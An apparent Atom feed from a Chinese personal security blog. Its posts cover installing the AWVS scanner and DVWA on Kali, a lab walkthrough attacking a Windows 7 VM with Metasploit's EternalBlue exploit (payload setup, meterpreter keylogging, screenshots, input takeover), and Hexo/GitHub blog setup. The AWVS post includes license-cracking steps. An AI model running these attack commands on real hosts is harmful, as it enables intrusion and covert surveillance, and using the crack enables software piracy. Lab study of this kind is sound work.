<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>IgTa&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-15T12:50:58.647Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Zhang Haonan</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Kali安装AWVS和Nessus</title>
    <link href="http://yoursite.com/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/"/>
    <id>http://yoursite.com/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/</id>
    <published>2020-04-15T08:46:44.000Z</published>
    <updated>2020-04-15T12:50:58.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装AWVS"><a href="#安装AWVS" class="headerlink" title="安装AWVS"></a>安装AWVS</h1><h2 id="配置阿里云更新源"><a href="#配置阿里云更新源" class="headerlink" title="配置阿里云更新源"></a>配置阿里云更新源</h2><p>（本次安装与部署的所有操作使用的都是root用户，非root用户在命令前添加sudo）  </p><p>1.打开终端，输入以下命令打开/etc/apt/sources.list文件<br><code>mousepad /etc/apt/sources.list</code>  </p><p><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/3.jpg"  alt><br>(mousepad是这一版本的kali自带的图形化文本编辑器)  </p><p>2.在所有非”#”开头的行前面添加”#”，并在文件中添加更新源，保存后退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#aliyun 阿里云更新源</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/1.png"  alt><br>3.执行以下命令，更新kali。<br><code>apt-get update ; apt-get upgrade</code>  </p><p>4.更新完成后，清理更新过程中产生的安装包<br><code>apt-get clean</code></p><h2 id="安装AWVS13"><a href="#安装AWVS13" class="headerlink" title="安装AWVS13"></a>安装AWVS13</h2><p>简介：Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。<br>AWVS13安装包地址：<a href="http://0verflow.cn/?p=1463" target="_blank" rel="noopener">http://0verflow.cn/?p=1463</a><br>1.将安装包复制粘贴至kali桌面<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/4.jpg"  alt><br>2.点击Extract Here解压<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/5.jpg"  alt><br>3.解压完成后，在此打开终端，并执行以下命令将解压后的文件夹复制到/opt目录下<br><code>cp -r awvs13-linux /opt</code><br>4.配置/opt/awvs13-linux目录的访问权限<br><code>chmod 755 /opt/awvs13-linux</code><br>5.进入/opt/awvs13-linux目录，为所有文件赋予执行权限<br><code>cd /opt/awvs13-linux ; chmod +x *</code><br>6.运行acunetix_13.0.200217097_x64_.sh<br><code>./acunetix_13.0.200217097_x64_.sh</code><br>7.出现&gt;&gt;&gt;时敲回车，进入AWVS的交互界面安装<br>(出现–More–时敲q)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">press ENTER to continue</span><br><span class="line">&gt;&gt;&gt;        按下Enter</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;阅读协议，一直按住回车键，到下面然后出现&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Accept the license terms? [yes|no]    你接受许可吗</span><br><span class="line">[no] &gt;&gt;&gt; yes</span><br><span class="line"></span><br><span class="line">Insert new hostname, or leave blank to use kali   主机名，填写127.0.0.1即可</span><br><span class="line">    Hostname [kali]:127.0.0.1</span><br><span class="line"></span><br><span class="line">Configuring the master user...         填写登录控制台的邮箱地址和密码(邮箱任意，密码需包含大小写数字和特殊字符)</span><br><span class="line">    Email: root@kali.com</span><br><span class="line">    Password: XXXXXX</span><br><span class="line">    Password again: XXXXXX</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;接下来就开始安装了&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Initializing file system...</span><br><span class="line"></span><br><span class="line">Extracting files to &#x2F;home&#x2F;acunetix&#x2F;.acunetix....</span><br><span class="line"></span><br><span class="line">Installing the database...</span><br><span class="line">.....</span><br><span class="line">.............</span><br><span class="line">......</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;安装完成&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Adding LSR shortcuts...</span><br><span class="line">Creating uninstall...</span><br><span class="line"></span><br><span class="line">Please visit https:&#x2F;&#x2F;127.0.0.1:3443&#x2F; to access Acunetix UI</span><br></pre></td></tr></table></figure><p>8.在虚拟机的浏览器中输入上面提供的URL即可使用AWVS13  </p><p><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/6.jpg"  alt> </p><p>9.接下来开始破解,进入解压包目录，并依次执行以下命令<br><code>cp -rf wvsc /home/acunetix/.acunetix/v_200217097/scanner/</code><br><code>cp -rf license_info.json /home/acunetix/.acunetix/data/license/</code>    </p><p>10.成功登陆<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/7.jpg"  alt> </p><p><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/8.jpg"  alt> </p><h2 id="AWVS管理命令"><a href="#AWVS管理命令" class="headerlink" title="AWVS管理命令"></a>AWVS管理命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service start acunetix         &#x2F;&#x2F;启动</span><br><span class="line">service status acunetix        &#x2F;&#x2F;启动</span><br><span class="line">service stop acunetix          &#x2F;&#x2F;停止</span><br><span class="line">service kill acunetix          &#x2F;&#x2F;杀死awvs的所以子程序</span><br><span class="line">service enable acunetix        &#x2F;&#x2F;使awvs开机自启</span><br><span class="line">service disable acunetix       &#x2F;&#x2F;关闭awvs开机自启</span><br><span class="line">service restart acunetix       &#x2F;&#x2F;重启</span><br></pre></td></tr></table></figure><h1 id="部署DVWA"><a href="#部署DVWA" class="headerlink" title="部署DVWA "></a>部署DVWA </h1><p>简介：DVWA（Damn Vulnerable Web App）是一个基于PHP/MySql搭建的Web应用程序，旨在为安全专业人员测试自己的专业技能和工具提供合法的 环境，帮助Web开发者更好的理解Web应用安全防范的过程。  </p><h2 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h2><p>1.从Github获取dvwa压缩包：<br><code>wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</code></p><p>2.解压并转移至/var/www/html<br><code>unzip -o -d /var/www/html master.zip</code>  </p><p>3.进入html文件夹并将文件重命名为dvwa<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/9.png"  alt><br>4.停止apache2服务<br><code>service apache2 stop</code><br>5.赋予dvwa文件夹755权限<br><code>chmod -R 755 /var/www/html/dvwa</code><br>6.进入dvwa文件夹，赋予文件相应权限<br><code>cd /var/www/html/dvwa/</code>  </p><p><code>chmod 755 hackable/uploads/</code>  </p><p><code>chmod 755 external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</code>  </p><p><code>chmod 755 config/</code>  </p><h2 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h2><p>Kali默认是MariaDB数据库，并不是Mysql，创建数据库时会报错<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/10.jpg"  alt>  </p><p>7.开启MySQL服务<br><code>service mysql start</code>  </p><p>8.连接MySQL，默认是进入MariaDB(密码默认为空)<br><code>mysql -uroot -p</code><br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/11.jpg"  alt><br>9.进入mysql，并将mysql的密码改为password<br><code>use mysql;</code><br><code>update user set password=PASSWORD(&#39;password&#39;) where User=&#39;root&#39;;</code>  </p><p>10.依次执行以下命令<br><code>create user dvwa;</code>  </p><p><code>grant all on dvwa.* to dvwa@localhost identified by &#39;password&#39;;</code>  </p><p><code>flush privileges;</code>  </p><p><code>grant all on dvwa.* to &#39;dvwa&#39;@&#39;%&#39;;</code>  </p><p><code>flush privileges;</code>  </p><h2 id="修改相关配置"><a href="#修改相关配置" class="headerlink" title="修改相关配置"></a>修改相关配置</h2><p>11.配置php对gd的支持<br><code>apt-get install php-gd</code>  </p><p>12.进入/etc/php/7.3/apache2文件夹，打开php.ini修改php配置<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/12.jpg"  alt>  </p><p>‘’allow_url_include=Off’’ 改为 ‘’allow_url_include=On’’<br>‘’display_errors=Off’’ 改为 ‘’display_errors=On’’  </p><p>13.进入/var/www/html/dvwa/config文件夹，复制配置模版文件并命名为config.inc.php<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/13.jpg"  alt> </p><p>14.修改config.inc.php文件<br>更改如下两项(ReCAPTCHA)：<br>    $_DVWA[ ‘recaptcha_public_key’ ]  = ‘ ‘;<br>    $_DVWA[ ‘recaptcha_private_key’ ] = ‘ ‘;<br>==&gt;<br>    $_DVWA[ ‘recaptcha_public_key’ ]  = ‘6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg’;<br>    $_DVWA[ ‘recaptcha_private_key’ ] = ‘6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ’;</p><p>15.修改数据库链接配置<br>‘db_user’ = ‘dvwa’;<br>‘db_password’ = ‘password’;<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/14.jpg"  alt>   </p><h2 id="部署成功"><a href="#部署成功" class="headerlink" title="部署成功"></a>部署成功</h2><p>16.启动apache2和mysql服务<br><code>service apache2 start</code><br><code>service mysql start</code>  </p><p>17.打开浏览器，访问localhost/dvwa，在设置界面点击Create/Reset Database，完成DVWA的数据库的配置  </p><p>18.完成，登陆DVWA<br>默认用户名：admin<br>默认密码：password<br><img src="/" class="lazyload" data-src="/2020/04/15/Kali%E5%AE%89%E8%A3%85AWVS%E5%92%8CNessus/15.jpg"  alt></p><h1 id="安装Nessus"><a href="#安装Nessus" class="headerlink" title="安装Nessus"></a>安装Nessus</h1><p>未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装AWVS&quot;&gt;&lt;a href=&quot;#安装AWVS&quot; class=&quot;headerlink&quot; title=&quot;安装AWVS&quot;&gt;&lt;/a&gt;安装AWVS&lt;/h1&gt;&lt;h2 id=&quot;配置阿里云更新源&quot;&gt;&lt;a href=&quot;#配置阿里云更新源&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
    
      <category term="安装教程" scheme="http://yoursite.com/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>metasploit下利用永恒之蓝攻击win7</title>
    <link href="http://yoursite.com/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/"/>
    <id>http://yoursite.com/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/</id>
    <published>2020-04-14T10:08:49.000Z</published>
    <updated>2020-04-14T14:16:24.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="metasploit下利用永恒之蓝攻击win7"><a href="#metasploit下利用永恒之蓝攻击win7" class="headerlink" title="metasploit下利用永恒之蓝攻击win7"></a>metasploit下利用永恒之蓝攻击win7</h1><p>实验环境：VMware<br>kali作为攻击机，win7作为靶机（防火墙和杀软已关闭）<br>渗透攻击(exploit)：指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。<br>攻击载荷(payload)：是我们期望目标系统在渗透攻击之后去执行的代码  </p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>1.初次使用metasploit需要初始化数据库<br><code>msfdb init/reinit</code><br>2.开启数据库<br><code>sudo service postgresql start</code><br>3.进入msf<br><code>msfconsole</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf1.jpg"  alt><br>4.搜索cve17-010相关的exp<br><code>search ms17-010</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf2.jpg"  alt><br>5.使用1号exp扫描漏洞是否存在<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br>查看相关参数<br><code>options</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf3.jpg"  alt><br>指定靶机ip<br><code>set RHOSTS 192.168.XXX.XXX</code>  </p><p>6.运行<br><code>run</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf4.jpg"  alt></p><h4 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h4><p>7.进入攻击模块（2号漏洞）<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>查看相关参数<br><code>options</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf5.jpg"  alt><br>可以看出受影响的分别是win7和server 2008 R2两种操作系统<br>指定靶机ip<br><code>set RHOSTS 192.168.XXX.XXX</code>  </p><p>8.查看payload<br><code>show payloads</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf6.jpg"  alt><br>使用15号payload<br><code>set payload 15</code><br>查看payload所需参数<br><code>options</code><br>设置本机(kali)ip<br><code>set LHOST 192.168.XXX.XXX</code>  </p><p>9.发动攻击<br><code>exploit</code><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf7.jpg"  alt> </p><h4 id="一些meterpreter命令"><a href="#一些meterpreter命令" class="headerlink" title="一些meterpreter命令"></a>一些meterpreter命令</h4><p><code>webcam_scream</code>  开启摄像头<br><code>screenshot</code> 截屏<br><code>keyscan_start</code> 开启键盘记录功能<br><code>keyscan_dump</code> 显示捕捉到的键盘记录信息<br><code>keyscan_stop</code>停止键盘记录功能<br><code>uictl enable keyboard/mouse</code> 接管目标主机的键盘和鼠标<br><code>reboot</code> 重启靶机<br><code>shutdown</code> 关闭靶机  </p><h4 id="截屏成功"><a href="#截屏成功" class="headerlink" title="截屏成功"></a>截屏成功</h4><p><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf8.png"  alt><br><img src="/" class="lazyload" data-src="/2020/04/14/metasploit%E4%B8%8B%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BBwin7/msf9.jpg"  alt> </p>]]></content>
    
    <summary type="html">
    
      使用kali进攻靶机
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>hexo+github 部署</title>
    <link href="http://yoursite.com/2020/04/02/hexo-github-%E9%83%A8%E7%BD%B2/"/>
    <id>http://yoursite.com/2020/04/02/hexo-github-%E9%83%A8%E7%BD%B2/</id>
    <published>2020-04-02T02:20:35.000Z</published>
    <updated>2020-04-14T16:04:00.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-github-部署"><a href="#hexo-github-部署" class="headerlink" title="hexo+github 部署"></a>hexo+github 部署</h1><p>推荐两篇教程<br><a href="https://www.cnblogs.com/visugar/p/6821777.html" target="_blank" rel="noopener">hexo从零开始到搭建完整</a><br><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html0" target="_blank" rel="noopener">使用hexo+github搭建免费个人博客详细教程</a><br>搭配使用基本能完成hexo的搭建  </p><h2 id="一些小坑"><a href="#一些小坑" class="headerlink" title="一些小坑"></a>一些小坑</h2><h4 id="1-安装git-bash"><a href="#1-安装git-bash" class="headerlink" title="1.安装git bash"></a>1.安装git bash</h4><p>咱大天朝就是qiang，<a href="https://gitforwindows.org/" target="_blank" rel="noopener">官网</a>下老半天下不完，无奈，用了百度网盘共享的git<br><a href="https://pan.baidu.com/s/1KxgfuCrVJPZCRv276QC4PQ" target="_blank" rel="noopener">Git-2.18.0-64-bit</a> 提取码：xxac<br><a href="https://pan.baidu.com/s/1yvpe84Ddh53RKRwV7dz0MA" target="_blank" rel="noopener">Git-2.19.0-64-bit</a> 提取码：peon  </p><h4 id="2-安装hexo"><a href="#2-安装hexo" class="headerlink" title="2.安装hexo"></a>2.安装hexo</h4><p>NodeJs的安装没遇到什么问题，一路next搞定<br>接下来安装hexo，<code>npm i -g hexo</code> +回车一气呵成，然后。。。卡住。。。  </p><p>还好有淘宝，切换taobao镜像  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>验证是否切换成功：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>输出淘宝源的地址 <a href="https://registry.npm.taobao.org/，" target="_blank" rel="noopener">https://registry.npm.taobao.org/，</a> 即切换成功。  </p><p>或者用cnpm也可代替大部分npm<br>安装代码: <code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p><h4 id="3-初始化hexo"><a href="#3-初始化hexo" class="headerlink" title="3.初始化hexo"></a>3.初始化hexo</h4><p>创建存放博客的文件夹，cd到该文件夹下，轻轻敲下 <code>hexo init</code> ，然后我又不出意外的卡住了。。别慌，说不定敲敲回车它就动了呢（别忘了还有cnpm可用）<br>当打开文件夹能看到一大堆文件时，成功已经不远啦  </p><h4 id="4-GitHub的相关配置"><a href="#4-GitHub的相关配置" class="headerlink" title="4.GitHub的相关配置"></a>4.GitHub的相关配置</h4><ul><li><p>创建账号<br>创建好账号后，改一下用户名，毕竟要在url上显示的（捂脸，我竟然不会改名）<br>点击头像右边的小三角，在setting中设置。<br>Public profile中的name是别人看到你时的名字<br>真正修改是在account中，点击change username，仔细看提示信息，假装看懂后就可以改名了  </p></li><li><p>创建repo<br>点击New repository创建一个repo，名称格式为: yourgithubname.github.io<br>把最下面那个initialize的复选框勾上，点击创建  </p></li><li><p>配置github账户信息  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;XXXXX&quot;  </span><br><span class="line">git config --global user.email  &quot;xxx@xx.com&quot;</span><br></pre></td></tr></table></figure></li><li><p>创建SSH  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</span><br></pre></td></tr></table></figure></li></ul><p>连续回车，然后去C盘user目录下找到.ssh\id_rsa.pub文件，用记事本复制里面的内容，放进GitHub个人设置中的SSH，title无所谓，保存搞定。<br>命令行敲下 <code>ssh -T git@github.com</code><br>提示Are you sure you want to continue connecting (yes/no)?，输入yes，如果看到看到以下信息：<br>Hi XXX! You’ve successfully authenticated, but GitHub does not provide shell access.<br>说明SSH配置成功啦！</p><ul><li>_config.yml的配置  </li></ul><p>用记事本/编辑器打开，修改deploy部分（一般在最下面）<br>我采用的是下面这种配置方式(注意，键值后要有空格)    </p><pre><code>---deploy:  type: git  repository: git@github.com:yourgithubname/  yourgithubname.github.io.git  branch: master  ---</code></pre><ul><li>安装一些插件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm i hexo-server</span><br></pre></td></tr></table></figure><ul><li>按顺序执行以下命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>应该没啥了，打开localhost:4000就能看见本地的博客啦  </p><blockquote><p>常用命令</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot; #新建文章  </span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面  </span><br><span class="line">hexo generate #生成静态页面至public目录  </span><br><span class="line">hexo server #开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）  </span><br><span class="line">hexo deploy #部署到GitHub  </span><br><span class="line">hexo help  # 查看帮助  </span><br><span class="line">hexo version  #查看Hexo的版本</span><br></pre></td></tr></table></figure><blockquote><p>缩写</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo n &#x3D;&#x3D; hexo new  </span><br><span class="line">hexo g &#x3D;&#x3D; hexo generate  </span><br><span class="line">hexo s &#x3D;&#x3D; hexo server  </span><br><span class="line">hexo d &#x3D;&#x3D; hexo deploy</span><br></pre></td></tr></table></figure><blockquote><p>组合</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo s -g #生成并本地预览  </span><br><span class="line">hexo d -g #生成并上传</span><br></pre></td></tr></table></figure><p>直接照着命令上传GitHub就行了，在浏览器中输入 <a href="http://yourgithubname.github.io" target="_blank" rel="noopener">http://yourgithubname.github.io</a> 就能看见你的博客了，吐槽一下GitHub。。真真卡成dog  </p><h4 id="5-写博客"><a href="#5-写博客" class="headerlink" title="5.写博客"></a>5.写博客</h4><p>用命令创建或者直接在source/_posts下创建md格式文件（有格式要求，最好还是用命令），然后就能用markdown写博客了  </p><p>我使用的是vscode，安装了两个插件 Markdown All in one(组合包)和Markdown Preview Github Styling(本地预览Markdown文件最终在Github Pages中显示的效果)  </p><p><a href="https://www.runoob.com/markdown/md-tutorial.html" target="_blank" rel="noopener">Markdown教程</a>  </p><h4 id="6-博客主题"><a href="#6-博客主题" class="headerlink" title="6.博客主题"></a>6.博客主题</h4><p>差点忘了还有主题这码事，可以用git直接下载到themes中，但。。git总是给我惊喜，所以我就直接去官网下载压缩包，解压到themes中，下载好后别忘了在_config.yml中修改主题，即theme：主题名。</p><p>若更改主题后启动服务器，显示如下：<br>extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial<br>解决方法：<br>执行<br><code>npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</code><br>清除缓存<br><code>hexo clean</code><br>生成静态文件<br><code>hexo g</code></p><h4 id="7-新建分类categories"><a href="#7-新建分类categories" class="headerlink" title="7.新建分类categories"></a>7.新建分类categories</h4><p>categories 页是用来展示所有分类的页面，如果 source 目录下还没有 categories/index.md 文件，那么你就需要新建一个，命令:  <code>hexo new page &quot;categories&quot;</code></p><p>编辑你刚刚新建的页面文件 /source/categories/index.md，至少需要以下内容:</p><pre><code>---title: categories  date: 2018-09-30 17:25:30  type: &quot;categories&quot;  layout: &quot;categories&quot;---</code></pre><h4 id="8-新建标签-tags-页"><a href="#8-新建标签-tags-页" class="headerlink" title="8.新建标签 tags 页"></a>8.新建标签 tags 页</h4><p>tags 页是用来展示所有标签的页面，如果在你的博客 source 目录下还没有 tags/index.md 文件，那么你就需要新建一个，命令：<br><code>hexo new page &quot;tags&quot;</code></p><p>编辑你刚刚新建的页面文件 /source/tags/index.md，至少需要以下内容：  </p><pre><code>---title: tags  date: 2018-09-30 18:23:38  type: &quot;tags&quot;  layout: &quot;tags&quot;---</code></pre><h4 id="9-新建about关于我页"><a href="#9-新建about关于我页" class="headerlink" title="9.新建about关于我页"></a>9.新建about关于我页</h4><p>about 页是用来展示关于我和我的博客信息的页面，如果在你的博客 source 目录下还没有 about/index.md 文件，那么你就需要新建一个，命令：<br><code>hexo new page &quot;about&quot;</code></p><p>编辑你刚刚新建的页面文件 /source/about/index.md，至少需要以下内容：</p><pre><code>---title: about  date: 2018-09-30 17:25:30  type: &quot;about&quot;  layout: &quot;about&quot;---</code></pre><h4 id="10-在文章中添加图片"><a href="#10-在文章中添加图片" class="headerlink" title="10.在文章中添加图片"></a>10.在文章中添加图片</h4><p>设置_config.yml中的post_asset_folder:true<br>安装 hexo-asset-image<br><code>npm install https://github.com/CodeFalling/hexo-asset-image --save</code><br>完成安装后,用hexo新建文章_posts目录下面就会多出一个和文章名字一样的文件夹。图片就可以放在文件夹下面。<br><code>![](文章的名字/XXX.jpg)</code></p>]]></content>
    
    <summary type="html">
    
      hexo+github安装教程
    
    </summary>
    
    
    
      <category term="安装教程" scheme="http://yoursite.com/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>时光回溯</title>
    <link href="http://yoursite.com/2020/01/26/%E6%97%B6%E5%85%89%E5%9B%9E%E6%BA%AF/"/>
